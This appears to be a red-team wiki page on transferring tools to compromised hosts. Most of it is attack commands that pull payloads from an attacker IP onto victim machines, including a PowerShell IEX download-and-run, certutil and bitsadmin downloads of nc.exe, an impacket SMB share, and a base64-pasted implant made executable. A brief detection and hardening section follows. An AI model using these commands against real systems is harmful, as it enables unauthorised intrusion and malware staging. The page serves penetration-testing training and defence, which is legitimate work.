---
title: File Transfer Techniques to Compromised Hosts
slug: file-transfer-techniques
---

> **TL;DR:** Once you land on a target, you almost always need to drop tooling — pick the transfer method that matches the shell quality, OS, and egress posture.

## What it is
A catalogue of in-band and out-of-band methods for moving binaries, scripts, and loot between attacker and victim during a beginner red team engagement. The right choice depends on whether you control an interactive shell, what binaries the OS ships with, and which protocols the firewall permits outbound. Treat transfers as a separate attack surface — many EDR alerts trigger on the staging step, not the payload itself.

## Preconditions / where it applies
- Foothold type: command injection (one-shot), reverse shell (interactive), or arbitrary file write
- Target OS: Linux (curl/wget/python usually present) vs Windows (certutil, bitsadmin, PowerShell)
- Egress restrictions: outbound HTTP only, no DNS, proxy-forced, or fully air-gapped lateral host

## Technique
Linux pull from attacker HTTP:
```bash
# attacker
python3 -m http.server 8000
# victim
curl http://10.10.14.5:8000/linpeas.sh -o /tmp/l.sh
wget http://10.10.14.5:8000/linpeas.sh -O /tmp/l.sh
```

Windows pull variants:
```powershell
# PowerShell in-memory (no disk write)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/x.ps1')
# certutil fallback when PS is locked down
certutil.exe -urlcache -split -f http://10.10.14.5:8000/nc.exe C:\Windows\Temp\nc.exe
# bitsadmin for very old hosts
bitsadmin /transfer j /priority high http://10.10.14.5:8000/x.exe C:\Temp\x.exe
```

SMB share for credential-friendly transfer:
```bash
# attacker
impacket-smbserver share ./ -smb2support -username r -password r
# victim
copy \\10.10.14.5\share\winpeas.exe C:\Windows\Temp\
```

Restricted shell fallback — base64 paste:
```bash
base64 -w0 implant.elf | xclip   # attacker
echo '<paste>' | base64 -d > /tmp/i && chmod +x /tmp/i
```

Note: SMB double-hop fails without credential delegation; stage via WebDAV or HTTP from the first hop.

## Detection and defence
- Process signals: `certutil -urlcache`, `bitsadmin /transfer`, child `powershell.exe` of office apps, `curl`/`wget` invoked by web service users
- Network signals: outbound to non-business IPs on 8000/8080/4444, SMB to non-domain IPs
- Hardening: egress allowlists, PowerShell ConstrainedLanguage + AMSI, block SMB outbound at perimeter, AppLocker rules denying `certutil` and `bitsadmin` for non-admin users

## References
- [LOLBAS Project](https://lolbas-project.github.io/) — canonical list of Windows living-off-the-land binaries
- [GTFOBins](https://gtfobins.github.io/) — Linux equivalent with transfer/exec primitives

See also: [[living-off-the-land]], [[payload-staging]], [[shell-upgrade-techniques]].
